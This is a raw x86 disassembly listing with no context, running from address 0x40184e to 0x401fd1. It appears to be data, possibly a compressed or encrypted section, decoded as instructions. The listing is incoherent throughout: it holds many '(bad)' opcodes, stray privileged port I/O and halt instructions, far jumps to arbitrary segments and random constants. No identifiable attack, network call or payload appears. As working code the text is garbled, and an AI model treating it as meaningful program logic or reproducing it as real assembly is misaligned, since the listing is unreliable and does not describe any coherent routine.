  40184e:	cmp    dl,cl
  401850:	loope  0x40187c
  401852:	xor    eax,0xddc9c227
  401857:	cmp    DWORD PTR [ecx],edx
  401859:	(bad)  
  40185a:	hlt    
  40185b:	inc    edi
  40185c:	push   0xf8a299e6
  401861:	mov    ds:0x78ef39cc,eax
  401866:	popf   
  401867:	loopne 0x401838
  401869:	hlt    
  40186a:	mul    BYTE PTR [esi-0x6ebfc461]
  401870:	push   cs
  401871:	mov    ebp,0xee60fe1c
  401876:	dec    ebx
  401877:	and    DWORD PTR [edx-0x68],ebx
  40187a:	sbb    DWORD PTR [esi+0x2f],esp
  40187d:	neg    BYTE PTR [ecx+0x2d]
  401880:	dec    ecx
  401881:	jmp    0x94b7:0x39d2090b
  401888:	call   0xecd7:0x95214506
  40188f:	lods   al,BYTE PTR ds:[esi]
  401890:	les    esp,FWORD PTR [esi+0x76]
  401893:	test   BYTE PTR es:[esi-0x1e],cl
  401897:	clc    
  401898:	mov    DWORD PTR [edi*8+0x4b421a1f],ebp
  40189f:	inc    ecx
  4018a0:	and    dl,BYTE PTR [esi+0x5b]
  4018a3:	test   bl,al
  4018a5:	das    
  4018a6:	mov    WORD PTR [edx+ecx*8+0x7f],cs
  4018aa:	xchg   ecx,eax
  4018ab:	jmp    DWORD PTR [ebx+0x0]
  4018ae:	rcr    DWORD PTR [ecx+0x414d2954],cl
  4018b4:	sub    DWORD PTR [esi],ebp
  4018b6:	scas   eax,DWORD PTR es:[edi]
  4018b7:	scas   al,BYTE PTR es:[edi]
  4018b8:	mov    bh,0xe6
  4018ba:	pop    es
  4018bb:	rcr    edx,cl
  4018bd:	add    DWORD PTR [edi+0x30fb15e4],esp
  4018c3:	jge    0x401919
  4018c5:	jb     0x401890
  4018c7:	and    eax,esp
  4018c9:	push   0xffffff96
  4018cb:	call   0x5d80589b
  4018d0:	out    0x98,eax
  4018d2:	mov    dl,0x7d
  4018d4:	pushf  
  4018d5:	hlt    
  4018d6:	fidiv  DWORD PTR [ebx]
  4018d8:	xchg   ebp,eax
  4018d9:	pop    eax
  4018da:	shl    bl,0xd5
  4018dd:	cmp    BYTE PTR [esi],ah
  4018df:	dec    ebp
  4018e0:	jmp    0x2ec6a0d
  4018e5:	and    al,0xee
  4018e7:	mov    esi,0x182cf541
  4018ec:	arpl   WORD PTR [ebx+edi*2],bx
  4018ef:	jge    0x40193c
  4018f1:	sub    BYTE PTR [edx],0xa
  4018f4:	shl    ch,cl
  4018f6:	sub    BYTE PTR [ebx],ah
  4018f8:	add    esi,esi
  4018fa:	hlt    
  4018fb:	push   esp
  4018fc:	cwde   
  4018fd:	mov    fs,WORD PTR [ebx]
  4018ff:	cmp    esi,DWORD PTR [ecx+eax*8]
  401902:	add    BYTE PTR [esi],bh
  401904:	or     eax,esp
  401906:	dec    ebx
  401907:	add    al,0x50
  401909:	mov    dl,0x85
  40190b:	call   0x6bf1fc5e
  401910:	push   ebx
  401911:	adc    eax,0x48163046
  401916:	push   ecx
  401917:	mov    BYTE PTR [edx-0x35],cl
  40191a:	dec    ebp
  40191b:	xchg   esi,eax
  40191d:	arpl   bp,si
  40191f:	xchg   esi,eax
  401920:	ins    BYTE PTR es:[edi],dx
  401921:	xchg   ebp,eax
  401922:	xor    ebx,DWORD PTR [edi]
  401924:	and    al,cl
  401926:	adc    eax,0x1380fccb
  40192b:	lds    esp,FWORD PTR [edx-0x24aa01f4]
  401931:	xchg   ebx,eax
  401932:	cmp    eax,0xb606211b
  401937:	rcl    DWORD PTR [esi-0x5d5b1b7f],0x82
  40193e:	out    dx,eax
  40193f:	jmp    0x4019a0
  401941:	push   ds
  401942:	mov    esp,0x500133fb
  401947:	call   0xd19:0xae1d9d01
  40194e:	adc    BYTE PTR [eax],al
  401950:	iret   
  401951:	mov    dl,0x18
  401953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401954:	jmp    edx
  401956:	leave  
  401957:	push   ebx
  401958:	xor    al,0x9
  40195a:	push   edx
  40195b:	jnp    0x401938
  40195d:	push   edx
  40195e:	push   edx
  40195f:	dec    eax
  401960:	xchg   ebx,eax
  401961:	test   ebp,esi
  401963:	aad    0x56
  401965:	inc    ecx
  401966:	and    DWORD PTR [ecx+0x3e355f4b],ebx
  40196c:	xchg   ebx,eax
  40196d:	je     0x40197d
  40196f:	lahf   
  401970:	push   cs
  401971:	jecxz  0x401980
  401973:	mov    ds:0x5cde8f9,eax
  401978:	idiv   BYTE PTR [ebx]
  40197a:	jg     0x4019a3
  40197c:	shl    BYTE PTR [ebp+0x63b76ce1],0x7c
  401983:	and    eax,0xef12adb1
  401988:	cdq    
  401989:	je     0x401945
  40198b:	jg     0x401951
  40198d:	imul   esi,DWORD PTR [edx],0xffffffbf
  401990:	in     al,dx
  401991:	out    0x87,al
  401993:	xor    edi,ecx
  401995:	out    0x2c,al
  401997:	mov    BYTE PTR [ecx+ecx*4],dl
  40199a:	cmp    ebp,edx
  40199c:	mov    cs,WORD PTR [edx]
  40199e:	xchg   esi,eax
  40199f:	pop    ebx
  4019a0:	ds mov esi,0xa04b9f2d
  4019a6:	aam    0xaa
  4019a8:	pop    ebx
  4019a9:	sub    ah,BYTE PTR [eax+0x1619d8b9]
  4019af:	lahf   
  4019b0:	stos   BYTE PTR es:[edi],al
  4019b1:	xlat   BYTE PTR ds:[ebx]
  4019b2:	gs adc al,0xde
  4019b5:	jno    0x401960
  4019b7:	ror    bp,0xfd
  4019bb:	pop    eax
  4019bc:	mov    al,0x6a
  4019be:	sub    eax,ebp
  4019c0:	or     eax,0x82931867
  4019c5:	mov    DWORD PTR [edx+0x5f81cf9f],0xf2f10218
  4019cf:	sbb    cl,BYTE PTR [ecx+0x1e]
  4019d2:	sbb    dh,BYTE PTR [ebx-0x255fabab]
  4019d8:	loopne 0x401a4b
  4019da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019db:	ret    0x4dbf
  4019de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019df:	hlt    
  4019e0:	loopne 0x401a0d
  4019e2:	jge    0x401a4b
  4019e4:	lahf   
  4019e5:	jnp    0x401a28
  4019e7:	mov    eax,ds:0xcffcfeb7
  4019ec:	icebp  
  4019ed:	(bad)  
  4019ef:	jp     0x401a2f
  4019f1:	in     al,0x12
  4019f3:	jno    0x4019e8
  4019f5:	aam    0x66
  4019f7:	adc    DWORD PTR [edi+0x44],0x91a456ad
  4019fe:	xchg   ebx,eax
  4019ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a00:	rcr    BYTE PTR [esi+eax*2],0x61
  401a04:	arpl   WORD PTR [ebx+edx*4+0x189a0af9],ax
  401a0b:	(bad)  
  401a0c:	stos   BYTE PTR es:[edi],al
  401a0d:	call   0x2590:0xcc2dd377
  401a14:	inc    ecx
  401a15:	retf   
  401a16:	add    ecx,DWORD PTR [eax+0x2b]
  401a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a1a:	dec    ebp
  401a1b:	test   BYTE PTR [edx+0x75],dh
  401a1e:	lds    edi,FWORD PTR [ebx-0x5abd1248]
  401a24:	cmp    DWORD PTR [edx],ecx
  401a26:	jmp    0xad36849
  401a2b:	je     0x401a47
  401a2d:	rcr    BYTE PTR [edi+0xe1d1e6],cl
  401a33:	jae    0x401a50
  401a35:	add    BYTE PTR [ebx-0x49],ch
  401a38:	retf   0xc36b
  401a3b:	rcl    BYTE PTR [ebx+0x38],1
  401a3e:	out    dx,eax
  401a3f:	aas    
  401a40:	inc    ecx
  401a41:	cmp    eax,0x6da5daa1
  401a46:	loop   0x401abe
  401a48:	mov    DWORD PTR [edx-0x75028d26],edx
  401a4e:	inc    ebx
  401a4f:	pushf  
  401a50:	sub    al,0x53
  401a52:	add    eax,0x3b2340b
  401a57:	outs   dx,DWORD PTR ds:[esi]
  401a58:	jecxz  0x4019f2
  401a5a:	enter  0x9efa,0x31
  401a5e:	dec    ecx
  401a5f:	xchg   edx,eax
  401a60:	gs (bad) 
  401a62:	fsubr  QWORD PTR [eax]
  401a64:	dec    ebx
  401a65:	mov    edi,0x22e5e705
  401a6a:	aad    0x96
  401a6c:	loop   0x4019f5
  401a6e:	stc    
  401a6f:	mov    al,BYTE PTR [eax+ebp*2+0xa]
  401a73:	mov    ah,0x69
  401a75:	shl    BYTE PTR [eax-0x58f8d37e],0x36
  401a7c:	push   esi
  401a7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a7e:	mov    bh,0x15
  401a80:	retf   
  401a81:	add    ch,ch
  401a83:	neg    BYTE PTR [edi-0x7d]
  401a86:	pop    es
  401a87:	fs cwde 
  401a89:	dec    esi
  401a8a:	xlat   BYTE PTR ds:[ebx]
  401a8b:	or     DWORD PTR [edi+0x46],0xa
  401a8f:	push   0x62e7d9be
  401a94:	mov    bl,0xd8
  401a96:	dec    eax
  401a97:	xor    DWORD PTR [ebx+0xef9a4b6],0x99d96207
  401aa1:	inc    edx
  401aa2:	mov    eax,ds:0xfa6c0d57
  401aa7:	lahf   
  401aa8:	iret   
  401aa9:	(bad)  
  401aab:	mov    dh,cl
  401aad:	cmp    ch,dl
  401aaf:	push   0xffffffff
  401ab1:	mov    eax,ds:0xb098e8ed
  401ab6:	add    DWORD PTR [ecx+0x1525e7a1],ebx
  401abc:	sub    ecx,DWORD PTR [edx]
  401abe:	fimul  DWORD PTR [esp+edi*8+0x7c496ca1]
  401ac5:	retf   0xe753
  401ac8:	int3   
  401ac9:	cmp    bh,bh
  401acb:	pop    edi
  401acc:	sbb    al,0x77
  401ace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401acf:	dec    ecx
  401ad0:	jns    0x401aba
  401ad2:	ror    dl,1
  401ad4:	scas   al,BYTE PTR es:[edi]
  401ad5:	jne    0x401a84
  401ad7:	mov    ch,BYTE PTR [eax]
  401ad9:	pusha  
  401ada:	adc    ch,BYTE PTR [esi-0x4]
  401add:	mov    ecx,0xb7f844b0
  401ae2:	stc    
  401ae3:	fsubr  QWORD PTR [edx+0xa534e4f]
  401ae9:	jecxz  0x401aa2
  401aeb:	xchg   ecx,eax
  401aec:	pop    esp
  401aed:	mov    al,0xf7
  401aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401af0:	js     0x401b1d
  401af2:	pop    es
  401af3:	cli    
  401af4:	sbb    edx,esi
  401af6:	mov    edx,0xc01bee59
  401afb:	test   al,0xb1
  401afd:	repnz pop ebx
  401aff:	adc    BYTE PTR [edx+0x6784aead],cl
  401b05:	inc    DWORD PTR [eax+0x41]
  401b08:	push   ds
  401b09:	jle    0x401b2e
  401b0b:	cmp    al,0x1d
  401b0d:	popa   
  401b0e:	fucomi st,st(1)
  401b10:	mov    bh,0xd7
  401b12:	shl    DWORD PTR [ebx],cl
  401b14:	fnsave [eax-0x6c933ba9]
  401b1a:	jp     0x401ae9
  401b1c:	ds fld DWORD PTR es:[eax+eiz*4-0x6b]
  401b22:	pop    ebp
  401b23:	scas   al,BYTE PTR es:[edi]
  401b24:	sbb    ebp,DWORD PTR [eax+0x70c4155]
  401b2a:	xchg   esp,eax
  401b2b:	dec    ebp
  401b2c:	sar    DWORD PTR [esi-0x46374828],cl
  401b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b33:	cwde   
  401b34:	je     0x401b4b
  401b36:	xor    eax,0x367ee7d1
  401b3b:	dec    eax
  401b3c:	push   es
  401b3d:	das    
  401b3e:	retf   
  401b3f:	mov    esp,DWORD PTR [edi-0x52f54c40]
  401b45:	js     0x401b70
  401b47:	or     dh,ch
  401b49:	rcr    DWORD PTR [ecx-0x25],cl
  401b4c:	pushf  
  401b4d:	sar    ebp,cl
  401b4f:	cmc    
  401b50:	xor    al,0xdf
  401b52:	and    BYTE PTR [eax+esi*1],al
  401b55:	mov    eax,0x53d7cb83
  401b5a:	mov    ch,0xba
  401b5c:	sbb    BYTE PTR [ecx],dl
  401b5e:	jg     0x401bdc
  401b60:	adc    BYTE PTR [edi],ah
  401b62:	inc    edi
  401b63:	loop   0x401b34
  401b65:	lods   eax,DWORD PTR ds:[esi]
  401b66:	mov    ah,0xf5
  401b68:	jno    0x401bbe
  401b6a:	sub    DWORD PTR [ecx-0x1c2327d3],esi
  401b70:	push   edx
  401b71:	push   0xffffff82
  401b73:	es jecxz 0x401b04
  401b76:	shl    bl,1
  401b78:	retf   
  401b79:	pop    ecx
  401b7a:	mov    eax,ds:0x7042b9c1
  401b7f:	scas   al,BYTE PTR es:[edi]
  401b80:	lahf   
  401b81:	adc    al,0x8a
  401b83:	fdivr  DWORD PTR [eax+ecx*4]
  401b86:	xchg   edi,eax
  401b87:	(bad)
  401b8b:	aas    
  401b8c:	(bad)  
  401b8d:	aas    
  401b8e:	jge    0x401c01
  401b90:	sahf   
  401b91:	aaa    
  401b92:	sub    al,0x88
  401b94:	mov    DWORD PTR [ecx-0x77],esp
  401b97:	mov    DWORD PTR [edi+0x2b],edx
  401b9a:	imul   dl
  401b9c:	pop    ebx
  401b9d:	xchg   edi,eax
  401b9e:	idiv   DWORD PTR [ebx-0x596165ac]
  401ba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ba5:	cmp    al,BYTE PTR [ecx]
  401ba7:	push   esi
  401ba8:	push   eax
  401ba9:	stos   BYTE PTR es:[edi],al
  401baa:	push   cs
  401bab:	jno    0x401bac
  401bad:	mov    dh,cl
  401baf:	mov    ds:0x71851e75,eax
  401bb4:	lods   al,BYTE PTR ds:[esi]
  401bb5:	jecxz  0x401c33
  401bb7:	mov    ah,0xab
  401bb9:	out    0xb6,al
  401bbb:	inc    esp
  401bbc:	xchg   esi,eax
  401bbd:	ds or  eax,0x8ecc2f66
  401bc3:	sub    al,0x45
  401bc6:	nop
  401bc7:	inc    edx
  401bc8:	cld    
  401bc9:	adc    esi,DWORD PTR [edi+ecx*8]
  401bcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bcd:	jge    0x401b5d
  401bcf:	xchg   esi,eax
  401bd0:	out    0xbd,al
  401bd2:	sub    eax,0x4b3b28
  401bd7:	cmp    al,0xbd
  401bd9:	cmp    cl,ah
  401bdb:	(bad)
  401bde:	push   esi
  401bdf:	xor    edi,DWORD PTR [esi-0x7374698e]
  401be5:	sub    DWORD PTR [edx],0x30372d0e
  401beb:	cmp    DWORD PTR [edx-0x4f65e1fd],ebp
  401bf1:	pop    edi
  401bf2:	mov    ecx,0xb3b68f7e
  401bf7:	cmp    ecx,DWORD PTR [esp+esi*2+0x7c5072aa]
  401bfe:	mov    ebx,0x35320737
  401c03:	cmc    
  401c04:	mov    esp,0x1b890889
  401c09:	repz into 
  401c0b:	mov    esi,0x17927a7a
  401c10:	fwait
  401c11:	icebp  
  401c12:	xchg   edi,eax
  401c13:	push   ebx
  401c14:	push   ecx
  401c15:	mov    es,WORD PTR [esp+ecx*2-0x1564fea1]
  401c1c:	and    eax,0xe077069d
  401c21:	ds inc edx
  401c23:	nop
  401c24:	(bad)  
  401c25:	mov    cs,ebx
  401c27:	sbb    al,0xb9
  401c29:	mov    eax,0x7ad00f6
  401c2e:	lods   al,BYTE PTR ds:[esi]
  401c2f:	in     eax,dx
  401c30:	pusha  
  401c31:	jne    0x401bb4
  401c33:	and    BYTE PTR [ebp+0x6dac3c10],ah
  401c39:	pop    ds
  401c3a:	rol    esi,0xea
  401c3d:	dec    ebx
  401c3e:	das    
  401c3f:	lahf   
  401c40:	ins    DWORD PTR es:[edi],dx
  401c41:	mov    esp,0x138ca25d
  401c46:	mov    ds:0x22b21c11,eax
  401c4b:	icebp  
  401c4c:	fistp  DWORD PTR [ecx+0x75]
  401c4f:	lods   al,BYTE PTR ds:[esi]
  401c50:	aas    
  401c51:	or     esi,0xc26036e5
  401c57:	mov    ecx,0x3772e53f
  401c5c:	test   ebx,ebp
  401c5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c5f:	mov    ebx,0xf871343a
  401c64:	cmp    dh,BYTE PTR [ecx]
  401c66:	push   eax
  401c67:	mov    esi,DWORD PTR [edx]
  401c69:	fst    st(3)
  401c6b:	(bad)  
  401c6c:	test   al,0x3c
  401c6e:	outs   dx,DWORD PTR ds:[esi]
  401c6f:	not    al
  401c71:	rcr    eax,1
  401c73:	imul   esp,DWORD PTR [edi],0x2c
  401c76:	ret    0x9671
  401c79:	add    DWORD PTR [esi-0x2dcba7d7],edi
  401c7f:	mov    ebx,0xbdae9b83
  401c84:	sub    al,0xb3
  401c86:	mov    esp,DWORD PTR [ebx+0x3e0d1b1e]
  401c8c:	push   edx
  401c8d:	outs   dx,DWORD PTR ds:[esi]
  401c8e:	cmp    DWORD PTR [esi],0x4899faa6
  401c94:	sub    al,0x58
  401c96:	jl     0x401cce
  401c98:	sar    DWORD PTR [edi+ebx*2],0xf5
  401c9c:	scas   eax,DWORD PTR es:[edi]
  401c9d:	mov    ch,0x70
  401c9f:	push   cs
  401ca0:	mov    ds:0x5aaee0cf,al
  401ca5:	jno    0x401d07
  401ca7:	ins    BYTE PTR es:[edi],dx
  401ca8:	mov    ecx,0x7cc25373
  401cad:	mov    ds:0x30619c99,eax
  401cb2:	push   ecx
  401cb3:	out    0x79,eax
  401cb5:	inc    edi
  401cb6:	arpl   WORD PTR [ebp+0x39],bx
  401cb9:	adc    al,0xbd
  401cbb:	dec    esi
  401cbc:	ss pusha 
  401cbe:	inc    ecx
  401cbf:	push   ebp
  401cc0:	ins    DWORD PTR es:[edi],dx
  401cc1:	imul   edi,DWORD PTR [edi],0xffffffd3
  401cc4:	in     eax,0x9b
  401cc6:	pop    ds
  401cc7:	in     eax,0xe2
  401cc9:	ret    0xec4
  401ccc:	scas   eax,DWORD PTR es:[edi]
  401ccd:	mov    cl,0xe3
  401ccf:	inc    eax
  401cd0:	add    al,0xf6
  401cd2:	popa   
  401cd3:	ins    DWORD PTR es:[edi],dx
  401cd4:	jns    0x401c61
  401cd6:	mov    esp,0x44f3c599
  401cdb:	pop    es
  401cdc:	inc    edi
  401cdd:	leave  
  401cde:	or     al,0xd8
  401ce0:	pop    edx
  401ce1:	dec    eax
  401ce2:	sub    dh,ch
  401ce4:	cmp    DWORD PTR [ecx],0x19
  401ce7:	(bad)  
  401ce8:	test   DWORD PTR [ebp+0x5c3431d3],ebx
  401cee:	pop    ss
  401cef:	dec    edi
  401cf0:	xor    DWORD PTR [eax+0x53],ebp
  401cf3:	pop    edi
  401cf4:	add    eax,0x1246663d
  401cf9:	xchg   esp,eax
  401cfa:	sub    BYTE PTR [edx],al
  401cfc:	out    dx,al
  401cfd:	or     DWORD PTR [edi-0x375b3d28],eax
  401d03:	and    eax,0xf88fdd4c
  401d08:	addr16 in al,dx
  401d0a:	cld    
  401d0b:	loope  0x401cfa
  401d0d:	clc    
  401d0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d0f:	out    dx,eax
  401d10:	mov    dl,0x9c
  401d12:	push   es
  401d13:	rcr    ebx,1
  401d15:	add    ecx,DWORD PTR [eax]
  401d17:	xor    eax,0x1dd4d0c7
  401d1c:	inc    ebp
  401d1d:	ret    0x48d
  401d20:	pop    ss
  401d21:	outs   dx,BYTE PTR ds:[esi]
  401d22:	adc    ah,BYTE PTR [ebx+esi*1]
  401d25:	jb     0x401d68
  401d27:	fld    TBYTE PTR [ecx-0x4c]
  401d2a:	popw   es
  401d2c:	lock sub ah,BYTE PTR [ebx-0x5b205b42]
  401d33:	push   edi
  401d34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d35:	into   
  401d36:	jecxz  0x401d58
  401d38:	pop    esp
  401d39:	and    DWORD PTR [esp+esi*1-0x37551763],0x417b3127
  401d44:	js     0x401d6a
  401d46:	loop   0x401d3a
  401d48:	jg     0x401d50
  401d4a:	(bad)  
  401d4b:	pop    eax
  401d4c:	and    eax,0x35a468bf
  401d51:	adc    BYTE PTR [eax-0x7a18bca5],0x13
  401d58:	jbe    0x401d90
  401d5a:	cmp    BYTE PTR [edi-0x35],ah
  401d5d:	leave  
  401d5e:	fisubr DWORD PTR [edx+eiz*1-0x4]
  401d62:	es jmp 0xd17e:0x69ffafc0
  401d6a:	stos   DWORD PTR es:[edi],eax
  401d6b:	mov    esp,DWORD PTR [edx+0x27ce76c6]
  401d71:	aad    0x8b
  401d73:	out    dx,eax
  401d74:	(bad)  
  401d75:	cwde   
  401d76:	push   ecx
  401d77:	mov    ecx,ebx
  401d79:	mov    ds:0xb072d7bc,al
  401d7e:	repz ja 0x401d50
  401d81:	or     eax,DWORD PTR [ecx]
  401d83:	sbb    bh,BYTE PTR [ecx+0x325f2b7c]
  401d89:	dec    ebp
  401d8a:	fcom   st(5)
  401d8c:	pop    esi
  401d8d:	test   esp,ebx
  401d8f:	pop    edx
  401d90:	cmp    ebp,DWORD PTR [esi]
  401d92:	adc    ah,BYTE PTR [esi+0x4]
  401d95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d96:	je     0x401d62
  401d98:	rcl    BYTE PTR [ecx+esi*1+0x5787c6e3],0xbe
  401da0:	loop   0x401d71
  401da2:	jbe    0x401dfd
  401da4:	jnp    0x401e01
  401da6:	gs test al,0x24
  401da9:	add    al,0x73
  401dab:	mov    eax,ds:0xdd8fcb90
  401db0:	mov    eax,0x101db652
  401db5:	push   es
  401db6:	loop   0x401d9f
  401db8:	mov    esi,DWORD PTR [edi]
  401dba:	jo     0x401e18
  401dbc:	test   ebp,edx
  401dbe:	(bad)  
  401dbf:	pop    edx
  401dc0:	out    0x9f,eax
  401dc2:	sbb    eax,0x4e567451
  401dc7:	dec    eax
  401dc8:	jnp    0x401dbc
  401dca:	adc    eax,0xb2136c90
  401dcf:	shr    DWORD PTR [edx-0x5a],cl
  401dd2:	dec    eax
  401dd3:	in     al,dx
  401dd4:	jp     0x401e3d
  401dd6:	sti    
  401dd7:	mov    bl,0x7e
  401dd9:	pop    esp
  401dda:	mov    ecx,0x8164b190
  401ddf:	mov    al,ah
  401de1:	mov    bl,0x56
  401de3:	nop
  401de4:	repz cmp eax,0xe58c1741
  401dea:	dec    esi
  401deb:	jecxz  0x401e35
  401ded:	es aaa 
  401def:	mov    ecx,edx
  401df1:	dec    ebp
  401df2:	inc    ebx
  401df3:	and    ah,BYTE PTR [ebx-0x55e64c4e]
  401df9:	xchg   BYTE PTR [edx],ch
  401dfb:	inc    eax
  401dfc:	ins    BYTE PTR es:[edi],dx
  401dfd:	pop    ebp
  401dfe:	mov    bl,0xd2
  401e00:	xchg   edi,ebp
  401e02:	std    
  401e03:	xor    BYTE PTR [ecx],bh
  401e05:	or     BYTE PTR [ebp-0x4569a353],al
  401e0b:	mov    edi,0x5d7ec7aa
  401e10:	or     ch,BYTE PTR [edx+0x7f]
  401e13:	enter  0xef71,0xd2
  401e17:	dec    edx
  401e18:	out    dx,al
  401e19:	xchg   BYTE PTR [ebx+0x17],ch
  401e1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e1d:	add    BYTE PTR [edx*1+0x907eeb7],cl
  401e24:	fcmovne st,st(2)
  401e26:	loope  0x401e04
  401e28:	pop    edi
  401e29:	xor    BYTE PTR [esi+0x6b],cl
  401e2c:	out    0x7f,al
  401e2e:	pop    ecx
  401e2f:	int3   
  401e30:	jb     0x401e38
  401e32:	mov    eax,0x5f44c3c9
  401e37:	dec    ebx
  401e38:	cmc    
  401e39:	xchg   edx,eax
  401e3a:	aad    0x7b
  401e3c:	adc    al,0x63
  401e3e:	inc    ebp
  401e3f:	sub    eax,0x473b5135
  401e44:	gs ins BYTE PTR es:[edi],dx
  401e46:	stos   BYTE PTR es:[edi],al
  401e47:	pop    eax
  401e48:	push   ecx
  401e49:	push   eax
  401e4a:	xchg   esp,eax
  401e4b:	dec    esp
  401e4c:	push   ds
  401e4d:	jmp    0xccef:0x545f796f
  401e54:	jle    0x401e89
  401e56:	enter  0xdd02,0xb
  401e5a:	and    esi,eax
  401e5c:	arpl   cx,sp
  401e5e:	(bad)  
  401e5f:	or     cl,BYTE PTR [eax]
  401e61:	sbb    ebp,DWORD PTR [ebp-0x1f4e516f]
  401e67:	inc    ecx
  401e68:	outs   dx,BYTE PTR ds:[esi]
  401e69:	nop
  401e6a:	xor    bl,BYTE PTR [ebp-0x2f]
  401e6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e6e:	sbb    DWORD PTR [edx],edx
  401e70:	mov    bl,0x97
  401e72:	mov    ds:0x2cd9c6cb,eax
  401e77:	dec    esp
  401e78:	int3   
  401e79:	shl    DWORD PTR [esi],cl
  401e7b:	das    
  401e7c:	jge    0x401e5f
  401e7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e7f:	pop    ebx
  401e80:	mov    BYTE PTR [ebx+0x18b4abca],dl
  401e86:	adc    eax,0xd7525cf3
  401e8b:	(bad)  
  401e8d:	mov    esp,0x5724e8ea
  401e92:	jmp    0x401ec3
  401e94:	sub    DWORD PTR [eax],ecx
  401e96:	xor    al,0x2a
  401e98:	pop    edi
  401e99:	jmp    0x401ecf
  401e9b:	and    al,0xa4
  401e9d:	inc    ecx
  401e9e:	dec    esi
  401e9f:	pop    esp
  401ea0:	jnp    0x401e29
  401ea2:	mov    BYTE PTR [esi+0x44],ch
  401ea5:	push   0x2f71ac31
  401eaa:	int    0xc9
  401eac:	cli    
  401ead:	jl     0x401ec8
  401eaf:	and    DWORD PTR [ebp+0x13d82b9a],edi
  401eb5:	mov    ds:0xe12b2e82,al
  401eba:	es addr16 out dx,al
  401ebd:	sub    al,0x7a
  401ebf:	mov    ah,0xb2
  401ec1:	fisubr DWORD PTR [edx+0x64d16e97]
  401ec7:	out    dx,al
  401ec8:	lods   al,BYTE PTR ds:[esi]
  401ec9:	sub    al,0xfb
  401ecb:	pop    ebp
  401ecc:	adc    DWORD PTR [esi],ebx
  401ece:	sbb    al,0x6d
  401ed0:	js     0x401f4b
  401ed2:	push   ss
  401ed3:	enter  0x8e94,0x76
  401ed7:	div    ecx
  401ed9:	inc    ebp
  401eda:	outs   dx,DWORD PTR ds:[esi]
  401edb:	sbb    eax,0x9dcc8733
  401ee0:	jge    0x401ec6
  401ee2:	mov    ch,0xd6
  401ee4:	xor    BYTE PTR [edx],0x17
  401ee7:	ins    DWORD PTR es:[edi],dx
  401ee8:	iret   
  401ee9:	and    BYTE PTR [ebx],ah
  401eeb:	cmp    BYTE PTR [edi+0x5c],bh
  401eee:	pop    esp
  401eef:	gs or  bh,ch
  401ef2:	test   ebx,esp
  401ef4:	adc    edi,DWORD PTR [ebx-0x79b20df1]
  401efa:	xchg   ebp,eax
  401efb:	push   ds
  401efc:	int3   
  401efd:	(bad)  
  401efe:	popa   
  401eff:	push   ecx
  401f00:	(bad)  
  401f01:	jp     0x401ed9
  401f03:	pop    edi
  401f04:	xchg   ch,bh
  401f06:	inc    eax
  401f07:	repz cmp eax,0xda67a208
  401f0d:	in     eax,dx
  401f0e:	call   0xa637:0x2cf84f0f
  401f15:	mov    ah,0x17
  401f17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f18:	xor    al,0xd2
  401f1a:	jmp    edx
  401f1c:	jmp    0x401f45
  401f1e:	(bad)  
  401f1f:	mov    ds:0x882c1ba8,al
  401f24:	pop    es
  401f25:	out    dx,al
  401f26:	add    DWORD PTR [ebx],esp
  401f28:	xor    DWORD PTR [ebx],edx
  401f2a:	sub    edx,DWORD PTR [esi-0x2c9c40d2]
  401f30:	or     ebx,DWORD PTR [ebx-0x67d4125a]
  401f36:	jmp    0x401f26
  401f38:	pop    ds
  401f39:	loope  0x401f42
  401f3b:	sub    al,0x6f
  401f3d:	es in  eax,dx
  401f3f:	or     eax,0x8c431c73
  401f44:	clc    
  401f45:	add    al,0x17
  401f47:	sub    bh,BYTE PTR [esi+0x3d80cef1]
  401f4d:	mov    esi,0x2cff4fa2
  401f52:	cmp    edi,DWORD PTR [ebx+0x0]
  401f55:	out    0xe3,al
  401f57:	popa   
  401f58:	and    eax,0xfe43f385
  401f5d:	les    esp,FWORD PTR [ebx]
  401f5f:	cwde   
  401f60:	je     0x401f62
  401f62:	jbe    0x401f30
  401f64:	xor    DWORD PTR [ebp+ecx*8-0x51],eax
  401f68:	sub    dl,BYTE PTR [ebx]
  401f6a:	fisub  DWORD PTR [ebx-0x46a34b00]
  401f70:	and    DWORD PTR [ebx],0x5f
  401f73:	inc    ebx
  401f74:	mov    BYTE PTR [edi],ch
  401f76:	in     eax,dx
  401f77:	mov    bl,0x37
  401f79:	call   0x1f3babb
  401f7e:	pop    eax
  401f7f:	(bad)  [edx-0x644f7011]
  401f85:	xor    eax,0xf9cf49a5
  401f8a:	sbb    dl,dh
  401f8c:	adc    eax,0xce1024e6
  401f92:	and    DWORD PTR [esi],esp
  401f94:	sbb    DWORD PTR [edi+ecx*1+0x1a],esp
  401f98:	jl     0x401f6c
  401f9a:	(bad)  
  401f9c:	in     al,0x4
  401f9e:	outs   dx,BYTE PTR ds:[esi]
  401f9f:	sbb    eax,0xddab3613
  401fa4:	jl     0x401f3a
  401fa6:	or     DWORD PTR [ebp+0x10],0xffffff89
  401faa:	out    0xc2,eax
  401fac:	aad    0xcf
  401fae:	mov    dh,0xa0
  401fb0:	mov    ebp,0x7211d4d8
  401fb5:	div    DWORD PTR [edx]
  401fb7:	adc    al,0x4e
  401fb9:	(bad)
  401fbc:	test   BYTE PTR [ebx+0x2a90916b],al
  401fc2:	mov    edi,0x9592b79a
  401fc7:	mov    eax,0x5ba67bfc
  401fcc:	popa   
  401fcd:	enter  0xeab6,0x94
  401fd1:	ins    BYTE PTR es:[edi],dx
